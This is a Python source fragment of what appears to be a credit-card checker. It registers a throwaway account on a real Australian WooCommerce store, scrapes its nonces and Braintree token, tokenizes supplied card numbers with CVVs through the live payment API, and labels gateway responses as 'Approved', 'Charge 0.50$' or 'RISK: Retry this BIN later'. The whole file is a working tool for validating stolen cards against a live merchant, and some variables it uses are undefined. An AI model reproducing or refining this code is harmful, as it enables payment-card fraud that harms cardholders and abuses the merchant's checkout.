	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result



















def Tele4(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx=ccx.strip()
	#ccx = g.strip().split('\n')[0]
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()


	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	rr= r.get('https://www.annavasily.com.au/wp-admin/', headers=headers)
	login=findall(r'name="register-security" value="(.*?)"',rr.text)[0]
	print(login)
	
	
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
    'pt_register_user_email': acc,
    'pt_register_user_password': acc,
    'pt_subscribe_me': 'on',
    'is_quiz': 'false',
    'action': 'pt_register_member',
    'register-security': login,
    '_wp_http_referer': '/',
}

	response = r.post('https://www.annavasily.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	rrr= r.get('https://www.annavasily.com.au/my-account/add-payment-method/', headers=headers)
	nonce=findall(r'name="_wpnonce" value="(.*?)"',rrr.text)[0]
	aut=rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	print(nonce)
	
	
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}



	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'c7ee5540-3661-4774-862f-47faddc81d09',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}



	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/579bb899ynkdj6ns/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/579bb899ynkdj6ns"},"merchantId":"579bb899ynkdj6ns","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Frezia","clientId":"Abojaq-ttmvpPaC_EvacqAUCVK0vKBCN23baNaPq2GA--sPe0FsC2r4ZF3Xa5Jegjdw2sP8uaILaAVfU","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"freziaAUD","payeeEmail":null,"currencyIsoCode":"AUD"}}',
    '_wpnonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post('https://www.annavasily.com.au/my-account/add-payment-method/', headers=headers, data=data)






	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Charge 0.50$ ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Charge 0.50$ ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result








		
		
		
		



		





